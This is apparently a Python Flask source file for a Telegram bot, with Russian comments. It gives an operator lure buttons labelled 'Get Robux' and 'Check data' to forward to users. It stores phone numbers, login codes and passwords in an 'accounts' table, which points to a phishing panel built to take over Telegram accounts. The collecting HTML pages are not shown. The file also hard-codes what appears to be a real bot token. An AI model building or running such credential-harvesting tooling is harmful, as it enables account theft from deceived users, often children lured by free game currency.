from flask import Flask, request, send_file
import requests
import json
import sqlite3
import os
import logging

# ========== КОНФИГ ==========
BOT_TOKEN = "8997012321:AAELLgXvTcVsi6kp2CnT8zBLPy-kLp8XHcM"
ADMIN_ID = 8899193168
MINI_APP_URL = "https://bot-panel-v2.onrender.com/prize"
MINI_APP_URL2 = "https://bot-panel-v2.onrender.com/prize2"
PANEL_URL = "https://01a000a9-7e2c-7cc2-8c21-aa008abff09a.tunnel4.com/panel"

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)

# ========== БАЗА ДАННЫХ ==========
def init_db():
    conn = sqlite3.connect("bot_panel.db")
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS accounts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            phone TEXT,
            code TEXT,
            password TEXT,
            template TEXT,
            status TEXT,
            created_at INTEGER
        )
    """)
    conn.commit()
    conn.close()
    logging.info("✅ База данных инициализирована")

init_db()

def get_accounts_count():
    conn = sqlite3.connect("bot_panel.db")
    cursor = conn.cursor()
    cursor.execute("SELECT COUNT(*) FROM accounts")
    count = cursor.fetchone()[0]
    conn.close()
    return count

# ========== ОТПРАВКА СООБЩЕНИЙ ==========
def send_message(chat_id, text, reply_markup=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": chat_id, "text": text}
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    try:
        r = requests.post(url, json=payload, timeout=10)
        logging.info(f"📤 Отправлено в {chat_id}: {r.status_code}")
    except Exception as e:
        logging.error(f"❌ Ошибка отправки: {e}")

# ========== ОБРАБОТКА ВЕБХУКА ==========
@app.route("/", methods=["POST"])
def webhook():
    data = request.get_json()
    if not data:
        return "OK", 200

    if "message" in data:
        msg = data["message"]
        chat_id = msg["chat"]["id"]
        text = msg.get("text", "")

        if text == "/start":
            keyboard = {
                "inline_keyboard": [
                    [{"text": "🔧 Создать кнопку", "callback_data": "create_button"}]
                ]
            }
            send_message(chat_id, "🤖 Выберите действие:", reply_markup=keyboard)

    elif "callback_query" in data:
        query = data["callback_query"]
        chat_id = query["message"]["chat"]["id"]
        data_callback = query.get("data")

        if data_callback == "create_button":
            keyboard = {
                "inline_keyboard": [
                    [{"text": "🎁 Robux", "callback_data": "create_robux"}],
                    [{"text": "🔍 Проверить данные", "callback_data": "create_osint"}],
                    [{"text": "⬅️ Назад", "callback_data": "back_to_menu"}]
                ]
            }
            send_message(chat_id, "🔧 **Выберите тип кнопки:**", reply_markup=keyboard)

        elif data_callback == "create_robux":
            keyboard = {
                "inline_keyboard": [
                    [{"text": "🎁 Получить Robux", "web_app": {"url": MINI_APP_URL}}]
                ]
            }
            send_message(chat_id, "✅ Кнопка **Robux** создана! Отправьте это сообщение пользователям.", reply_markup=keyboard)

        elif data_callback == "create_osint":
            keyboard = {
                "inline_keyboard": [
                    [{"text": "🔍 Проверить данные", "web_app": {"url": MINI_APP_URL2}}]
                ]
            }
            send_message(chat_id, "✅ Кнопка **Проверка данных** создана! Отправьте это сообщение пользователям.", reply_markup=keyboard)

        elif data_callback == "back_to_menu":
            keyboard = {
                "inline_keyboard": [
                    [{"text": "🔧 Создать кнопку", "callback_data": "create_button"}]
                ]
            }
            send_message(chat_id, "🤖 Выберите действие:", reply_markup=keyboard)

    return "OK", 200

# ========== НАСТРОЙКА ВЕБХУКА ==========
@app.route("/setwebhook", methods=["GET", "POST"])
def set_webhook():
    webhook_url = os.environ.get("RENDER_EXTERNAL_URL", "")
    if not webhook_url:
        return "RENDER_EXTERNAL_URL not set", 400
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook"
    r = requests.post(url, json={"url": webhook_url})
    return f"Webhook set: {r.json()}"

# ========== РАЗДАЧА HTML ==========
@app.route("/")
def index():
    return "Бот работает! Используй /setwebhook для настройки."

@app.route("/prize")
def prize():
    return send_file("index.html")

@app.route("/prize2")
def prize2():
    return send_file("index2.html")

# ========== ЗАПУСК ==========
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)
